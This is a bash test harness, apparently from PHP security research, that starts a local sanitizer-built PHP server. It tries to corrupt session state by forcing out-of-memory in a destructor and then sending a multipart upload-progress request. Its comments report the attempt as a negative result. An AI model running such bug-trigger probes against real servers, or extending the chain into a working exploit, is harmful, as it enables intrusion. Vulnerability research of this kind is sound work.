#!/bin/bash
# php2shell rung 3 — compound 618-OOM x rfc1867 consumer on a PERSISTENT worker.
#
# Question (from the fix patch read): php_rshutdown_session_globals() dtors
# PS(http_session_vars) FIRST and sets session_status=none LAST, with no
# zend_try of its own — an OOM raised by a session-held object's __destruct
# during that window should leave stale globals (status active, dangling
# session-vars zval) for the NEXT request's pre-RINIT rfc1867 upload-progress
# decode (php_hash_environment runs before zend_activate_modules in
# 8.4.26 main.c). This harness exercises exactly that compound on one
# cli-server worker:
#   r1  destruct-OOM with the session active (OOM fires during request
#       shutdown while the session holds the object),
#   probe the same PID,
#   r3  multipart POST with the SAME session id -> the pre-RINIT rfc1867
#       decode consumes r1's session record,
#   probe again.
# Expected signal if the stale window is live: sanitizer/ZEND_ASSERT on the
# worker, or a misbehaving decode. Observed 2026-11-20 on 8.4.26-asan
# (debug+ASan): fully absorbed — see the report; preserved as a negative.
# Usage: bash lab/repro/php2shell-rung3-rfc1867-persist.sh <php-cli-bin> [outdir]
#   php-cli-bin: lab/build/php-<ver>-<mode>/sapi/cli/php

set -u
PHP=$(readlink -f "$1")
OUT=${2:-lab/build/evidence}
LABEL=$(basename "$(dirname "$(dirname "$(dirname "$1")")")" | sed 's/^php-//')
mkdir -p "$OUT"
PORT=18085
LOG="$OUT/rung3-rfc1867-persist-$LABEL.log"
D=$(mktemp -d)
SESS="$D/sess"; DOC="$D/doc"; mkdir -p "$SESS" "$DOC"
WPID=""
cleanup() { [ -n "$WPID" ] && kill "$WPID" 2>/dev/null; rm -rf "$D"; }
trap cleanup EXIT

cat > "$DOC/r1.php" <<'EOF'
<?php
class E { function __destruct() { $a=[]; while(true){$a[]=str_repeat("x",1<<20);} } }
session_start();
$_SESSION['e'] = new E();
echo "r1 done sid=".session_id()."\n";
EOF
printf '<?php echo "alive:" . getmypid() . " status_none:" . (session_status()===PHP_SESSION_NONE) . "\n";' > "$DOC/r2.php"
printf '<?php echo "r3 " . session_id() . " sess-e:" . (isset($_SESSION["e"])?"yes":"no") . "\n";' > "$DOC/r3.php"
printf -- '--BOUNDX\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\npocsid1\r\n--BOUNDX\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nupkey\r\n--BOUNDX\r\nContent-Disposition: form-data; name="f"; filename="f.txt"\r\n\r\n1\r\n--BOUNDX--\r\n' > "$D/body.multipart"

wait_port_free() {
  for _ in $(seq 1 50); do
    ss -tln 2>/dev/null | grep -q ":$PORT " || return 0
    sleep 0.2
  done
}
wait_port_free
ASAN_OPTIONS=detect_leaks=0 "$PHP" -S 127.0.0.1:$PORT -t "$DOC" \
  -d memory_limit=8M -d display_errors=1 -d html_errors=0 \
  -d session.save_path="$SESS" -d session.name=PHPSESSID \
  -d session.use_cookies=0 -d session.use_only_cookies=0 \
  -d session.use_strict_mode=0 -d session.serialize_handler=php \
  -d session.upload_progress.enabled=1 -d session.upload_progress.freq=1% \
  > "$D/worker.log" 2>&1 &
WPID=$!
for _ in $(seq 1 50); do
  ss -tln 2>/dev/null | grep -q ":$PORT " && break
  sleep 0.2
done

{
  echo "-- probe0: $(curl -s -m 10 "http://127.0.0.1:$PORT/r2.php?PHPSESSID=pocsid1")"
  echo "-- r1 (destruct-OOM, session active):"
  curl -s -m 60 "http://127.0.0.1:$PORT/r1.php?PHPSESSID=pocsid1" | head -c 500
  echo
  echo "-- probe1: $(curl -s -m 10 "http://127.0.0.1:$PORT/r2.php")"
  echo "-- sess file after r1: $(cat "$SESS/sess_pocsid1" 2>/dev/null)"
  echo "-- r3 multipart same-sid: $(curl -s -m 30 -X POST -H 'Content-Type: multipart/form-data; boundary=BOUNDX' --data-binary @"$D/body.multipart" "http://127.0.0.1:$PORT/r3.php")"
  echo "-- probe2: $(curl -s -m 10 "http://127.0.0.1:$PORT/r2.php")"
} >> "$LOG" 2>&1

kill "$WPID" 2>/dev/null; wait "$WPID" 2>/dev/null; WPID=""
echo "== verdict scan (log: $LOG)"
if grep -qE 'AddressSanitizer|runtime error:|SEGV|Assertion|SUMMARY' "$D/worker.log" "$LOG"; then
  echo "   SIGNAL: sanitizer/assert present — inspect $LOG and worker log excerpt below"
  grep -E 'AddressSanitizer|runtime error|SEGV|Assertion|SUMMARY' "$D/worker.log" "$LOG" | head
  cat "$D/worker.log" >> "$LOG"
  exit 3
fi
cat "$D/worker.log" >> "$LOG"
echo "   no sanitizer/assert signal; worker survived every step — compound negative, inspect $LOG"
exit 0
